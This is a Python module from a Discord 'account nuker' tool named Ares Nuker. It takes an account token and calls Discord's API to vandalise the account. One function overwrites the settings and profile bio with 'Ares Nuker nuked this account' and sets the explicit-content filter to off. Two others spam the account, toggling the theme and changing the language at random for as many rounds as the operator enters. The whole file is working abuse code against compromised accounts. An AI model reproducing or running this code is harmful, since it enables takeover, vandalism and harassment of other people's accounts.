__import__('sys').path.append('../')
import global_vars, requests, json, time, random
from AresNuker import Console
from rich.console import Console as Con
from .requests_maker import GetQ

q = GetQ()
con = Con()
console = Console()
headers_account = global_vars.headers_account
config = global_vars.config

setting = {
          'theme': "light",
          'locale': "ja",
          'inline_embed_media': False,
          'inline_attachment_media': False,
          'gif_auto_play': False,
          'enable_tts_command': False,
          'render_embeds': False,
          'render_reactions': False,
          'animate_emoji': False,
          'convert_emoticons': False,
          'message_display_compact': False,
          'explicit_content_filter': '0',
          "custom_status": {"text": "Ares Nuker nuked this account <3"},
          'status': "idle"
}
bio = {
	'bio': '> Ares Nuker On Top :3\n> https://www.youtube.com/watch?v=sFUmPSyG61c ',
     'pronouns': 'Nuked'
}
def SetWorstSettings() -> None:
	try:
		requests.patch("https://discord.com/api/v7/users/@me/settings", headers=headers_account, json=setting)
		requests.patch("https://discord.com/api/v9/users/@me/profile", headers=headers_account, json=bio)
		console.log('Set worst account settings')
	except:
		console.error('Unble set worst account settings')

def SpamTheme() -> None:
     light = {
          'theme': "light",
     }
     dark = {
          'theme': "dark"
     }
     amount = 0

     while True:
          try:
               amount = int(con.input(' [white][[purple]~/account-nuker/amount-spam-theme[white]] [purple]>[grey78] '))
               break
          except:
               console.error('Only Int')
               continue

     for i in range(amount):
          try:
               q.put((requests.patch, "https://discord.com/api/v7/users/@me/settings", headers_account, dark))
               console.log('Change theme to dark')
               time.sleep(0.5)
               q.put((requests.patch, "https://discord.com/api/v7/users/@me/settings", headers_account, light))
               console.log('Change theme to light')
          except:
               console.error('Unble to spam theme')


def SpamLang() -> None:
     langs = {
          'da': 'YgYKBAoCZGE=',
          'de': 'YgYKBAoCZGU=',
          'es-ES': 'YgkKBwoFZXMtRVM=',
          'fr': 'YgYKBAoCZnI=',
          'hr': 'YgYKBAoCaHI=',
          'it': 'YgYKBAoCaXQ=',
          'lt': 'YgYKBAoCbHQ=',
          'hu': 'YgYKBAoCaHU=',
          'bg': 'YgYKBAoCYmc=',
          'hi': 'YgYKBAoCaGk=',
          'zh-CN': 'YgkKBwoFemgtQ04=',
          'ja': 'YgYKBAoCamE=',
          'ko': 'YgYKBAoCa28='
     }
     lang_list = list(langs)
     amount = 0

     while True:
          try:
               amount = int(con.input(' [white][[purple]~/account-nuker/amount-spam-lang[white]] [purple]>[grey78] '))
               break
          except:
               console.error('Only Int')
               continue

     for i in range(amount):
          name_lang = random.choice(lang_list)
          lang = langs[name_lang]
          payload = {'settings': lang}
          try:
               q.put((requests.patch, 'https://discord.com/api/v7/users/@me/settings-proto/1', headers_account, payload))
               console.log(f'Change language to {name_lang}')
               time.sleep(5)
          except:
               console.error(f'Unble to change language to {name_lang}')